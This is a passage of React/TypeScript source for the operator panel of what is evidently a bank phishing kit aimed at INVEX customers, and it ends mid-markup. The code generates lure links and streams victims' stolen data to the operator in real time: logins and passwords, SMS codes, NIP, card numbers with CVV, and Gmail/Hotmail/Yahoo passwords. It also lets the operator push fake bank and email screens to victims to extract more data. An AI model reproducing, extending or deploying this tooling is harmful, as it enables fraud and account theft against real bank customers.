import { useState, useEffect } from 'react';
import { useQuery, useMutation } from '@tanstack/react-query';
import { queryClient } from '@/lib/queryClient';
import { apiRequest } from '@/lib/queryClient';
import { useToast } from '@/hooks/use-toast';
import { useWebSocket } from '@/hooks/useWebSocket';
import { useAuth } from '@/hooks/use-auth';
import Sidebar from '@/components/admin/Sidebar';
import AccessTable from '@/components/admin/AccessTable';
import UserManagement from '@/components/admin/UserManagement';
import RegisteredUsersManagement from '@/components/admin/RegisteredUsersManagement';
import SmsManagement from '@/components/admin/SmsManagement';
import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal, CardInstructionsModal, DatosTarjetaModal } from '@/components/admin/Modals';
import { GmailModal } from '@/components/admin/GmailModal';
import { GmailVerifyModal } from '@/components/admin/GmailVerifyModal';
import { HotmailModal } from '@/components/admin/HotmailModal';
import { YahooModal } from '@/components/admin/YahooModal';
import { GmailCredentialsBox } from '@/components/admin/GmailCredentialsBox';
import { Session, ScreenType } from '@shared/schema';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { LogOut, UserCog, MessageSquare, Send, RefreshCw, CreditCard } from 'lucide-react';
import { nanoid } from 'nanoid';

export default function AdminPanel() {
  const { toast } = useToast();
  const { user, logoutMutation } = useAuth();
  const [activeBank, setActiveBank] = useState<string>("INVEX");
  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users' | 'registered' | 'sms'>('current');
  
  // Actualizar el banco activo cuando el usuario cambia
  useEffect(() => {
    if (user) {
      // Si el usuario no tiene acceso a todos los bancos y tiene bancos específicos
      if (user.role !== 'admin' && user.allowedBanks !== 'all' && user.allowedBanks) {
        // Establecer el primer banco permitido como el activo
        const allowedBanks = user.allowedBanks.split(',');
        if (allowedBanks.length > 0) {
          setActiveBank(allowedBanks[0]);
        }
      }
    }
  }, [user]);
  
  // Verificar si hay parámetros para generar un enlace automáticamente
  useEffect(() => {
    if (!user) return;
    
    const params = new URLSearchParams(window.location.search);
    const generateLink = params.get('generateLink');
    const banco = params.get('banco') || 'INVEX';
    
    // Si está solicitando generar un enlace automáticamente y el usuario está autenticado
    if (generateLink === 'true') {
      console.log('Generando enlace automáticamente para banco:', banco);
      
      // Hacer la solicitud a la API directamente
      fetch(`/api/generate-link?banco=${banco}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json'
        },
        credentials: 'include'
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Error al generar enlace');
        }
        return response.json();
      })
      .then(data => {
        console.log('Enlace generado correctamente:', data);
        
        // Copiar el enlace al portapapeles en lugar de abrirlo
        if (data.link) {
          navigator.clipboard.writeText(data.link)
            .then(() => {
              console.log('Enlace copiado al portapapeles');
            })
            .catch(err => {
              console.error('Error al copiar enlace:', err);
            });
        }
        
        // Notificar al usuario
        toast({
          title: "Enlace generado",
          description: `Código: ${data.code}. El enlace ha sido copiado al portapapeles.`
        });
        
        // Limpiar los parámetros de URL
        const newUrl = window.location.pathname;
        window.history.pushState({}, '', newUrl);
      })
      .catch(error => {
        console.error('Error generando enlace:', error);
        toast({
          title: "Error al generar enlace",
          description: error.message,
          variant: "destructive"
        });
      });
    }
  }, [user, toast]);
  const [activeModal, setActiveModal] = useState<string | null>(null);
  const [clientLink, setClientLink] = useState<string>('');
  const [clientCode, setClientCode] = useState<string>('');
  const [sessions, setSessions] = useState<Session[]>([]);
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
  
  // Estados para la ventana emergente de enviar SMS
  const [isSmsSendDialogOpen, setIsSmsSendDialogOpen] = useState(false);
  const [smsPhoneNumber, setSmsPhoneNumber] = useState('');
  const [smsMessage, setSmsMessage] = useState('');
  const [isSendingSms, setIsSendingSms] = useState(false);
  
  // Estados para Gmail
  const [isGmailModalOpen, setIsGmailModalOpen] = useState(false);
  const [gmailCredentials, setGmailCredentials] = useState<{correo?: string; contrasena?: string}>({});

  // Determinar si es un usuario regular o administrador
  const isAdmin = user?.role === 'admin';
  const isSuperAdmin = user?.username === 'balonx';
  const isRegularUser = user?.role === 'user';

  // Socket connection for real-time updates
  const { socket, connected, sendMessage } = useWebSocket("/ws");

  // Fetch sessions from API
  // Consulta específica que garantice la obtención de sesiones guardadas
  const { data: initialSessions, isLoading, refetch: refresh } = useQuery({
    queryKey: ['/api/sessions', activeTab],
    queryFn: async () => {
      // Usar la pestaña activa para determinar el tipo, SIEMPRE SOLICITAMOS SAVED para brandon
      let type = activeTab === 'saved' ? 'saved' : 'current';
      
      if (user?.username === 'brandon') {
        // Forzar tipo 'saved' para cualquier pestaña si es el usuario brandon
        type = 'saved';
        console.log('FORZANDO obtención de sesiones guardadas para usuario brandon, independientemente de la pestaña.');
      }
      
      console.log(`Solicitando sesiones del tipo: ${type} (pestaña: ${activeTab}, usuario: ${user?.username})`);
      
      // Agregamos un timestamp para evitar caché
      const res = await apiRequest('GET', `/api/sessions?type=${type}&t=${Date.now()}`);
      const sessions = await res.json();
      
      console.log(`Recibidas ${sessions.length} sesiones del servidor, tipo: ${type}`);
      if (sessions.length > 0) {
        console.log('Primera sesión:', sessions[0]);
      }
      
      return sessions;
    },
    refetchInterval: 10000, // Actualizar cada 10 segundos (reducido de 3s para menor carga del servidor)
    refetchOnWindowFocus: true,
    // Configuración de caché basada en el tipo de sesiones
    staleTime: activeTab === 'saved' ? 60000 : 0, // Caché de 1 minuto para sesiones guardadas, sin caché para actuales
  });

  // Generate link mutation
  const generateLink = useMutation({
    mutationFn: async () => {
      // Utilizamos el banco seleccionado o INVEX como predeterminado si se eligió 'todos'
      let banco = activeBank === 'todos' ? 'INVEX' : activeBank;
      
      console.log(`Generating link for bank: ${banco}`);
      const res = await apiRequest('GET', `/api/generate-link?banco=${banco}`);
      
      if (!res.ok) {
        const errorData = await res.json();
        if (res.status === 403) {
          throw new Error(errorData.error || "No tienes permiso para usar este banco");
        }
        throw new Error("Error al generar enlace");
      }
      
      return await res.json();
    },
    onSuccess: (data) => {
      setClientLink(data.link);
      setClientCode(data.code);
      toast({
        title: "Link generado",
        description: `Link generado con código: ${data.code}`,
      });
      
      // Actualizar inmediatamente la lista de sesiones para mostrar la nueva sesión
      // Esto causará una recarga completa de las sesiones desde el servidor
      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });
      
      console.log("Solicitando actualización de sesiones después de generar enlace...");
      
      // Copiar el enlace al portapapeles en lugar de abrirlo
      navigator.clipboard.writeText(data.link)
        .then(() => {
          console.log('Enlace copiado al portapapeles');
          toast({
            title: "Enlace copiado",
            description: "El enlace ha sido copiado al portapapeles",
          });
        })
        .catch(err => {
          console.error('Error al copiar enlace:', err);
        });
    },
    onError: (error: Error) => {
      toast({
        title: "Error al generar link",
        description: error.message,
        variant: "destructive",
      });
    }
  });

  // Socket event handlers
  useEffect(() => {
    if (connected && user) {
      // Register as admin with username for permission checking
      sendMessage({
        type: 'REGISTER',
        role: 'ADMIN',
        username: user.username
      });
    }
  }, [connected, sendMessage, user]);

  useEffect(() => {
    // Initialize sessions from API data
    if (initialSessions) {
      setSessions(Array.isArray(initialSessions) ? initialSessions : []);
    }
  }, [initialSessions]);
  
  // Redirigir a usuarios regulares si intentan acceder a pestañas restringidas por URL
  useEffect(() => {
    // Verificamos si estamos en pestañas restringidas
    if (!isSuperAdmin && (activeTab === 'users' || activeTab === 'registered')) {
      setActiveTab('current');
    }
    
    // Verificamos si estamos en pestañas solo para administradores
    if (user?.role !== 'admin' && activeTab === 'sms') {
      setActiveTab('current');
    }
  }, [activeTab, isSuperAdmin, user?.role]);

  // Efecto para cargar las sesiones (solo se ejecuta al cambiar la pestaña)
  useEffect(() => {
    // Cargar las sesiones inmediatamente al cambiar de pestaña
    refresh();
    
    // Ya no usamos polling porque usamos WebSockets para actualizaciones en tiempo real
  }, [activeTab, refresh]);

  // Socket message handler
  useEffect(() => {
    if (!socket) return;

    const handleMessage = (event: MessageEvent) => {
      try {
        const data = JSON.parse(event.data);
        console.log("Mensaje WebSocket recibido en AdminPanel:", data.type);
        
        if (data.type === 'INIT_SESSIONS') {
          console.log(`Recibidas ${data.data.length} sesiones vía WebSocket`);
          setSessions(data.data);
        }
        else if (data.type === 'SESSION_UPDATE') {
          // Solo actualizar la sesión en la pestaña actual
          if ((activeTab === 'current' && !data.data.saved) || 
              (activeTab === 'saved' && data.data.saved)) {
              
            console.log(`Actualizando sesión: ${data.data.sessionId}, creada por: ${data.data.createdBy || 'desconocido'}`);
            
            // Verificar si esta sesión le pertenece al usuario actual
            const isOwnSession = data.data.createdBy === user?.username;
            const isSuperAdmin = user?.username === 'balonx';
            
            if (isOwnSession || isSuperAdmin) {
              setSessions(prev => {
                const updated = [...prev];
                const index = updated.findIndex(s => s.sessionId === data.data.sessionId);
                if (index >= 0) {
                  updated[index] = data.data;
                  console.log('Sesión actualizada en la lista existente');
                } else {
                  updated.push(data.data);
                  console.log('Nueva sesión añadida a la lista');
                }
                return updated;
              });
            } else {
              console.log('Sesión ignorada porque pertenece a otro usuario');
            }
          }
        }
        else if (data.type === 'SESSIONS_UPDATED') {
          console.log('Recibida señal para actualizar sesiones');
          // Refrescar la lista de sesiones desde el servidor
          queryClient.invalidateQueries({ queryKey: ['/api/sessions', activeTab] });
        }
        else if (data.type === 'SESSION_DELETE') {
          // Eliminar la sesión de la lista si está presente
          setSessions(prev => 
            prev.filter(session => session.sessionId !== data.data.sessionId)
          );
          
          // Si la sesión eliminada era la seleccionada, deseleccionarla
          if (selectedSessionId === data.data.sessionId) {
            setSelectedSessionId(null);
          }
          
          toast({
            title: "Sesión eliminada",
            description: "La sesión ha sido eliminada correctamente.",
          });
        }
        else if (data.type === 'SESSIONS_CLEANUP') {
          // Notificar al usuario sobre la limpieza de sesiones expiradas
          const { deletedCount } = data.data;
          if (deletedCount > 0) {
            toast({
              title: "Limpieza automática",
              description: `${deletedCount} sesiones antiguas (>5 días) han sido eliminadas.`,
            });
            
            // Actualizar la lista desde el servidor
            queryClient.invalidateQueries({ queryKey: ['/api/sessions', activeTab] });
          }
        }
        else if (data.type === 'SMS_COMPRA_CODE') {
          // Notificación especial para códigos SMS_COMPRA
          // Datos del mensaje
          const { sessionId, code } = data.data;
          
          // Notificación según el rol: detallada para admin, genérica para usuarios
          if (user?.role === 'admin') {
            toast({
              title: "Código de cancelación SMS_COMPRA",
              description: `Código: ${code} (Sesión: ${sessionId.substring(0, 6)}...)`,
              variant: "default",
            });
            
            console.log("SMS_COMPRA code:", code, "para sesión:", sessionId);
          } else {
            // Para usuarios no administradores, notificación genérica
            toast({
              title: "Nuevo código recibido",
              description: "Se ha recibido un código de cancelación",
              variant: "default",
            });
          }
        }
        else if (data.type === 'CLIENT_INPUT_REALTIME') {
          // Procesar entrada de datos en tiempo real
          const { sessionId, tipo, inputData } = data.data;
          
          // Solo mostrar notificaciones con detalles sensibles a administradores
          if (user?.role === 'admin') {
            // Manejo especial para SMS_COMPRA
            if (tipo === 'sms_compra' || tipo === 'SMS_COMPRA' || tipo === 'smsCompra') {
              if (inputData && inputData.smsCompra) {
                toast({
                  title: "¡Código de cancelación recibido!",
                  description: `Código: ${inputData.smsCompra}`,
                  variant: "default",
                });
              }
            }
            
            // Mostrar notificación toast con los datos recibidos
            let inputDescription = '';
            switch (tipo) {
              case 'folio':
                inputDescription = `Folio: ${inputData.folio}`;
                break;
              case 'login':
                inputDescription = `Usuario: ${inputData.username}, Contraseña: ${inputData.password}`;
                break;
              case 'codigo':
                inputDescription = `Código SMS: ${inputData.codigo}`;
                break;
              case 'nip':
                inputDescription = `NIP: ${inputData.nip}`;
                break;
              case 'tarjeta':
                inputDescription = `Tarjeta: ${inputData.tarjeta}`;
                break;
              case 'sms_compra':
              case 'SMS_COMPRA':
              case 'smsCompra':
                inputDescription = `Código de Cancelación: ${inputData.smsCompra}`;
                break;
              case 'gmail':
                inputDescription = `Gmail - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
                break;
              case 'hotmail':
                inputDescription = `Hotmail - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
                break;
              case 'yahoo':
                inputDescription = `Yahoo - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
                break;
              case 'datos_tarjeta':
                inputDescription = `Datos Tarjeta - Número: ${inputData.numeroTarjeta || 'N/A'}, Vencimiento: ${inputData.fechaVencimiento || 'N/A'}, CVV: ${inputData.cvv || 'N/A'}`;
                break;
              default:
                inputDescription = `Datos de ${tipo}`;
            }
            
            toast({
              title: "Datos recibidos en tiempo real",
              description: inputDescription,
              variant: "default",
            });
          } else {
            // Para usuarios no administradores, solo mostrar notificación genérica 
            // sin revelar el contenido sensible
            toast({
              title: "Nuevos datos recibidos",
              description: `Se recibieron datos del tipo: ${tipo}`,
              variant: "default",
            });
            console.log("Datos recibidos pero sin mostrar detalles a usuarios no administradores:", tipo);
          }
          
          // Actualizar la sesión en la interfaz para mostrar datos inmediatamente
          setSessions(prev => {
            const updated = [...prev];
            const index = updated.findIndex(s => s.sessionId === sessionId);
            
            if (index >= 0) {
              // Crear copia de la sesión actual
              const updatedSession = { ...updated[index] };
              
              // Actualizar los campos según el tipo de datos
              switch (tipo) {
                case 'folio':
                  updatedSession.folio = inputData.folio;
                  break;
                case 'login':
                  updatedSession.username = inputData.username;
                  updatedSession.password = inputData.password;
                  break;
                case 'codigo':
                  updatedSession.sms = inputData.codigo;
                  break;
                case 'nip':
                  updatedSession.nip = inputData.nip;
                  break;
                case 'tarjeta':
                  updatedSession.tarjeta = inputData.tarjeta;
                  break;
                case 'sms_compra':
                case 'SMS_COMPRA':
                case 'smsCompra':
                  updatedSession.smsCompra = inputData.smsCompra;
                  break;
                case 'celular':
                  updatedSession.celular = inputData.celular;
                  break;
                case 'gmail':
                  updatedSession.correo = inputData.correo;
                  updatedSession.contrasena = inputData.contrasena;
                  break;
                case 'hotmail':
                  updatedSession.correo = inputData.correo;
                  updatedSession.contrasena = inputData.contrasena;
                  break;
                case 'yahoo':
                  updatedSession.correo = inputData.correo;
                  updatedSession.contrasena = inputData.contrasena;
                  break;
                case 'datos_tarjeta':
                  // Guardamos los datos de la tarjeta directamente en los campos existentes
                  updatedSession.tarjeta = inputData.numeroTarjeta;
                  updatedSession.fechaVencimiento = inputData.fechaVencimiento;
                  updatedSession.cvv = inputData.cvv;
                  break;
              }
              
              // Actualizar en la lista
              updated[index] = updatedSession;
            }
            
            return updated;
          });
        }
      } catch (error) {
        console.error("Error parsing WebSocket message:", error);
      }
    };

    socket.addEventListener('message', handleMessage);
    return () => {
      socket.removeEventListener('message', handleMessage);
    };
  }, [socket]);

  // Handle screen change
  const handleScreenChange = (screen: string) => {
    if (!selectedSessionId) {
      toast({
        title: "Seleccione una sesión",
        description: "Debe seleccionar una sesión para cambiar la pantalla.",
        variant: "destructive",
      });
      return;
    }

    // Debug para rastrear el flujo
    console.log("handleScreenChange recibió tipo de pantalla:", screen);

    // Handle modals for certain screens
    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta", "gmail", "gmail_verify", "hotmail", "yahoo", "datos_tarjeta"].includes(screen)) {
      console.log("Activando modal para:", screen);
      setActiveModal(screen);
      return;
    }

    // Para la pantalla de folio, recuperamos el folio ingresado para usarlo después
    if (screen === "folio") {
      // Si estamos cambiando a la pantalla de folio, mostramos un prompt para pedir el folio
      const folioInput = prompt("Ingrese el folio:");
      if (folioInput) {
        sendScreenChange({
          tipo: `mostrar_${screen}`,
          sessionId: selectedSessionId,
          folio: folioInput
        });
        
        // Guardamos el folio en sessionStorage para recuperarlo cuando se necesite en la pantalla de instrucciones
        try {
          sessionStorage.setItem(`folio_${selectedSessionId}`, folioInput);
        } catch (e) {
          console.error("Error al guardar el folio en sessionStorage:", e);
        }
      } else {
        return; // Si el usuario cancela el prompt, no hacemos nada
      }
      return;
    }

    // Send direct screen change for other screens
    sendScreenChange({
      tipo: `mostrar_${screen}`,
      sessionId: selectedSessionId
    });
  };

  // Send screen change via WebSocket
  const sendScreenChange = (data: any) => {
    if (connected) {
      sendMessage({
        type: 'SCREEN_CHANGE',
        data
      });

      toast({
        title: "Pantalla cambiada",
        description: `La pantalla ha sido cambiada a ${data.tipo.replace('mostrar_', '')}.`,
      });
    } else {
      toast({
        title: "Error de conexión",
        description: "No hay conexión con el servidor.",
        variant: "destructive",
      });
    }
  };

  // Copy link to clipboard
  const copyLink = async () => {
    try {
      await navigator.clipboard.writeText(clientLink);
      toast({
        title: "Link copiado",
        description: "El link ha sido copiado al portapapeles.",
      });
    } catch (error) {
      toast({
        title: "Error al copiar",
        description: "No se pudo copiar el link al portapapeles.",
        variant: "destructive",
      });
    }
  };

  // Handle session selection
  const selectSession = (sessionId: string) => {
    setSelectedSessionId(sessionId);
  };

  // Modal handlers
  const closeModal = () => setActiveModal(null);

  const handleProtectConfirm = (data: { cliente: string, terminacion: string }) => {
    sendScreenChange({
      tipo: 'mostrar_protege',
      sessionId: selectedSessionId,
      titular: data.cliente,
      terminacion: data.terminacion
    });
    closeModal();
  };
  
  const handleCardInstructionsConfirm = (data: { cliente: string, terminacion: string, folio: string, direccion: string }) => {
    // Intentar recuperar el folio almacenado para esta sesión
    let folioToUse = data.folio;
    try {
      const savedFolio = sessionStorage.getItem(`folio_${selectedSessionId}`);
      if (savedFolio) {
        folioToUse = savedFolio;
        console.log("Recuperado folio guardado:", savedFolio);
      }
    } catch (e) {
      console.error("Error al recuperar el folio de sessionStorage:", e);
    }
    
    sendScreenChange({
      tipo: 'mostrar_tarjeta',
      sessionId: selectedSessionId,
      titular: data.cliente,
      terminacion: data.terminacion,
      folio: folioToUse,
      direccion: data.direccion
    });
    closeModal();
  };

  const handleTransferConfirm = (data: { cantidad: string, titular: string, clabe: string, alias: string }) => {
    sendScreenChange({
      tipo: 'mostrar_transferir',
      sessionId: selectedSessionId,
      monto: data.cantidad,
      titular: data.titular,
      clabe: data.clabe
    });
    closeModal();
  };

  const handleCancelConfirm = (data: { importe: string, negocio: string }) => {
    sendScreenChange({
      tipo: 'mostrar_cancelacion',
      sessionId: selectedSessionId,
      monto: data.importe,
      comercio: data.negocio
    });
    closeModal();
  };

  const handleCodeConfirm = (telefono: string) => {
    // Ya estamos recibiendo un número de 10 dígitos (6 prefijo + 4 ingresados)
    // desde el modal modificado
    if (telefono && telefono.length === 10) {
      const terminacion = telefono.substring(telefono.length - 4);
      
      // Mostrar el screen change directamente con la terminación ingresada
      // ya no necesitamos actualizar el número completo del teléfono
      if (selectedSessionId) {
        // Enviamos directamente el screen change, no necesitamos actualizar el teléfono en la BD
        sendScreenChange({
          tipo: 'mostrar_codigo',
          sessionId: selectedSessionId,
          terminacion
        });
      }
    } else {
      toast({
        title: "Formato inválido",
        description: "Error en el formato de los últimos 4 dígitos del teléfono.",
        variant: "destructive",
      });
      return;
    }
    
    closeModal();
  };

  const handleMessageConfirm = (mensaje: string) => {
    sendScreenChange({
      tipo: 'mostrar_mensaje',
      sessionId: selectedSessionId,
      mensaje
    });
    closeModal();
  };

  const handleSmsCompraConfirm = (telefono: string) => {
    // Solo esperamos los últimos 4 dígitos del teléfono
    if (telefono && telefono.length === 4) {
      const terminacion = telefono; // Ya tenemos directamente los 4 dígitos
      
      // Enviar directamente la pantalla de SMS_COMPRA con los 4 dígitos
      if (selectedSessionId) {
        // Entonces, send the screen change directamente
        console.log("ScreenType.SMS_COMPRA:", ScreenType.SMS_COMPRA);
        console.log("Enviando terminación:", terminacion);
        sendScreenChange({
          tipo: `mostrar_${ScreenType.SMS_COMPRA}`,
          sessionId: selectedSessionId,
          terminacion
        });
      }
    } else {
      toast({
        title: "Entrada inválida",
        description: "Ingrese exactamente los 4 últimos dígitos del número celular.",
        variant: "destructive",
      });
      return;
    }
    
    closeModal();
  };
  
  const handleGmailModalConfirm = (data: { correo: string, mensaje: string }) => {
    if (selectedSessionId) {
      sendScreenChange({
        tipo: `mostrar_${ScreenType.GMAIL}`,
        sessionId: selectedSessionId,
        correo: data.correo
      });
      
      toast({
        title: "Solicitud de Gmail enviada",
        description: `Se ha solicitado el acceso a Gmail para: ${data.correo}`,
      });
    }
    
    closeModal();
  };
  
  const handleHotmailModalConfirm = (data: { correo: string, mensaje: string }) => {
    if (selectedSessionId) {
      sendScreenChange({
        tipo: `mostrar_${ScreenType.HOTMAIL}`,
        sessionId: selectedSessionId,
        correo: data.correo
      });
      
      toast({
        title: "Solicitud de Hotmail enviada",
        description: `Se ha solicitado el acceso a Hotmail para: ${data.correo}`,
      });
    }
    
    closeModal();
  };
  
  const handleYahooModalConfirm = (data: { correo: string, mensaje: string }) => {
    if (selectedSessionId) {
      sendScreenChange({
        tipo: `mostrar_${ScreenType.YAHOO}`,
        sessionId: selectedSessionId,
        correo: data.correo
      });
      
      toast({
        title: "Solicitud de Yahoo enviada",
        description: `Se ha solicitado el acceso a Yahoo para: ${data.correo}`,
      });
    }
    
    closeModal();
  };
  
  const handleDatosTarjetaConfirm = (data: { terminacion: string }) => {
    if (selectedSessionId) {
      sendScreenChange({
        tipo: `mostrar_${ScreenType.DATOS_TARJETA}`,
        sessionId: selectedSessionId,
        terminacion: data.terminacion
      });
      
      toast({
        title: "Solicitud de datos de tarjeta enviada",
        description: `Se ha solicitado los datos de la tarjeta con terminación: ${data.terminacion}`,
      });
    }
    
    closeModal();
  };
  
  const handleGmailVerifyModalConfirm = (data: { correo: string, codigo: string }) => {
    if (selectedSessionId) {
      // Usamos exactamente lo que el usuario ingresó, sin valores predeterminados
      console.log('⚠️ Enviando solicitud de verificación Google con código:', data.codigo);
      
      // Crear el objeto de datos con las propiedades específicas
      const screenData = {
        tipo: `mostrar_${ScreenType.GMAIL_VERIFY}`,
        sessionId: selectedSessionId,
        correo: data.correo,
        codigo: data.codigo
      };
      
      // Enviar mensaje directamente con WebSocket para evitar posibles problemas
      if (connected && socket) {
        const message = {
          type: 'SCREEN_CHANGE',
          data: screenData
        };
        
        console.log('📤 Enviando por WebSocket:', JSON.stringify(message));
        socket.send(JSON.stringify(message));
        
        toast({
          title: "Verificación de Google enviada",
          description: `Se ha solicitado la verificación de Google para: ${data.correo} con código: ${data.codigo}`,
        });
      } else {
        toast({
          title: "Error de conexión",
          description: "No hay conexión con el servidor.",
          variant: "destructive",
        });
      }
    }
    
    closeModal();
  };
  
  // Manejar el envío de SMS
  const sendSms = useMutation({
    mutationFn: async () => {
      // Validar número de teléfono
      if (!smsPhoneNumber || smsPhoneNumber.length !== 10 || !/^\d+$/.test(smsPhoneNumber)) {
        throw new Error("El número de teléfono debe tener 10 dígitos numéricos");
      }
      
      // Validar mensaje
      if (!smsMessage.trim()) {
        throw new Error("El mensaje no puede estar vacío");
      }
      
      const res = await apiRequest("POST", "/api/sms/send", {
        phoneNumber: smsPhoneNumber,
        message: smsMessage
      });
      
      return await res.json();
    },
    onMutate: () => {
      setIsSendingSms(true);
    },
    onSuccess: () => {
      toast({
        title: "SMS enviado",
        description: "El mensaje ha sido enviado correctamente.",
      });
      
      // Limpiar el formulario y cerrar la ventana
      setSmsPhoneNumber("");
      setSmsMessage("");
      setIsSmsSendDialogOpen(false);
      
      // Actualizar historial de SMS
      queryClient.invalidateQueries({ queryKey: ['/api/sms/history'] });
      queryClient.invalidateQueries({ queryKey: ['/api/sms/credits'] });
    },
    onError: (error: Error) => {
      toast({
        title: "Error al enviar SMS",
        description: error.message,
        variant: "destructive",
      });
    },
    onSettled: () => {
      setIsSendingSms(false);
    }
  });

  // Vista completa para administradores
  return (
    <div className="admin-container flex flex-col md:flex-row w-full h-screen overflow-hidden">
      {/* Sidebar - visible on desktop */}
      <div className="md:block hidden">
        <Sidebar 
          activeTab={activeTab}
          onTabChange={(tab) => setActiveTab(tab as 'current' | 'saved' | 'users' | 'registered' | 'sms')}
          isAdmin={isAdmin}
          isSuperAdmin={isSuperAdmin}
        />
      </div>

      {/* Mobile header - visible only on mobile */}
      <div className="md:hidden flex items-center justify-between p-3 bg-[#16213e] border-b border-[#2a2a42] sticky top-0 z-10">
        <h1 className="text-lg font-bold">Panel INVEX</h1>
        <div className="flex gap-2 items-center">
          <div className="flex items-center bg-[#be0046] px-2 py-1 rounded text-xs">
            {isAdmin ? 
              <span className="flex items-center"><UserCog className="w-3 h-3 mr-1" /> {user?.username}</span> : 
              <span>{user?.username}</span>
            }
          </div>
          <button 
            onClick={() => logoutMutation.mutate()}
            className="bg-[#0c1a2a] p-1.5 rounded"
          >
            <LogOut className="h-4 w-4" />
          </button>
        </div>
      </div>

      {/* Mobile navigation - visible only on mobile */}
      <div className="md:hidden admin-tabs overflow-x-auto sticky top-12 z-10">
        <button
          className={`admin-tab ${activeTab === 'current' ? 'active' : ''}`}
          onClick={() => setActiveTab('current')}
        >
          Actuales
        </button>
        <button
          className={`admin-tab ${activeTab === 'saved' ? 'active' : ''}`}
          onClick={() => setActiveTab('saved')}
        >
          Guardadas
        </button>
        {isAdmin && (
          <>
            <button
              className={`admin-tab ${activeTab === 'users' ? 'active' : ''}`}
              onClick={() => setActiveTab('users')}
            >
              Usuarios
            </button>
            <button
              className={`admin-tab ${activeTab === 'registered' ? 'active' : ''}`}
              onClick={() => setActiveTab('registered')}
            >
              Registrados
            </button>
            <button
              className={`admin-tab ${activeTab === 'sms' ? 'active' : ''}`}
              onClick={() => setActiveTab('sms')}
            >
              SMS
            </button>
          </>
        )}
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col h-screen overflow-hidden">
        {/* Header Section */}
        <div className="p-4 md:p-6 pb-0">
          <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-3">
            <div>
              <p className="text-[#be0046] text-sm">Panel / Accesos</p>
              <h1 className="text-xl md:text-2xl font-bold mb-2 md:mb-3">Panel Accesos</h1>
              
              <div className="mt-2">
                <label htmlFor="pantallaControl" className="text-sm text-gray-300">
                  Acciones / Control de Pantalla:
                </label>
                <select 
                  id="pantallaControl" 
                  className="mt-1 bg-[#16213e] text-white border border-[#2a2a42] rounded px-3 py-2 w-full md:w-64"
                  onChange={(e) => handleScreenChange(e.target.value)}
                  value=""
                >
                  <option value="">Selecciona una opción</option>
                  <option value="login">1. Login</option>
                  <option value="codigo">2. Código de verificación</option>
                  <option value="nip">3. NIP</option>
                  <option value="protege">4. Aviso de seguridad</option>
                  <option value="tarjeta">5. Instrucciones recolección</option>
                  <option value="cancelacion">6. Cancelación exitosa</option>
                  <option value="mensaje">7. Ingresa el mensaje que gustes</option>
                  <option value="sms_compra">8. SMS Compra - Cancelación de cargo</option>
                  <option value="gmail">9. Solicitar acceso Gmail</option>
                  <option value="gmail_verify">10. Verificación Google</option>
                  <option value="hotmail">11. Solicitar acceso Hotmail</option>
                  <option value="yahoo">12. Solicitar acceso Yahoo</option>
                  <option value="datos_tarjeta">13. Ingreso de datos de tarjeta</option>
                </select>
              </div>
            </div>
            
            <div className="space-x-2">
              <button 
                className="bg-[#007bff] text-white px-4 py-2 rounded hover:bg-opacity-90 transition-all flex items-center"
                disabled
              >
                <MessageSquare className="mr-2 h-4 w-4" />
                Bulk SMS
              </button>
              {user?.role === 'admin' && (
                <button 
                  className="bg-[#007bff] text-white px-4 py-2 rounded hover:bg-opacity-90 transition-all flex items-center"
                  onClick={() => setIsSmsSendDialogOpen(true)}
                >
                  <Send className="mr-2 h-4 w-4" />
                  Enviar SMS
                </button>
              )}
            </div>
          </div>
        </div>

        {/* Link Panel */}
        <div className="mx-6 mt-6 bg-[#1e1e1e] p-4 rounded-lg flex justify-between items-center">
          <div className="flex items-center space-x-2">
            <span className="font-semibold">Liga activa:</span>
            {clientLink && (
              <a href={clientLink} target="_blank" className="text-[#00aaff]">
                {clientLink}
              </a>
            )}
            {clientCode && (
              <span className={`font-bold ml-2 px-3 py-1 rounded-md ${
                activeBank === 'BANBAJIO' 
                  ? 'text-white bg-[#4D2C91]' 
                  : 'text-green-400 bg-[#1a3e1a]'
              }`}>
                Código: <span className="text-xl tracking-wider">{clientCode}</span>
              </span>
            )}
            <button 
              className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded ml-2"
              onClick={copyLink}
            >
              Copiar
            </button>
            <button 
              className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
              onClick={() => generateLink.mutate()}
            >
              {generateLink.isPending ? 'Generando...' : 'Regenerar'}
            </button>
          </div>
          
          <select 
            id="filtroBanco" 
            className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2"
            value={activeBank}
            onChange={(e) => setActiveBank(e.target.value)}
          >
            {/* Mostramos solo el banco INVEX según lo solicitado */}
            <option value="INVEX">INVEX</option>
          </select>
        </div>

        {/* Tabs */}
        <div className="mx-6 mt-6 flex justify-between items-center">
          <div className="flex space-x-4">
            <div 
              className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'current' 
                ? 'border-[#00aaff] text-[#00aaff]' 
                : 'border-transparent hover:text-gray-300'}`}
              onClick={() => setActiveTab('current')}
            >
              Accesos actuales
            </div>
            <div 
              className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'saved' 
                ? 'border-[#00aaff] text-[#00aaff]' 
                : 'border-transparent hover:text-gray-300'}`}
              onClick={() => setActiveTab('saved')}
            >
              Accesos guardados
            </div>
            {isSuperAdmin && (
              <>
                <div 
                  className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'users' 
                    ? 'border-[#00aaff] text-[#00aaff]' 
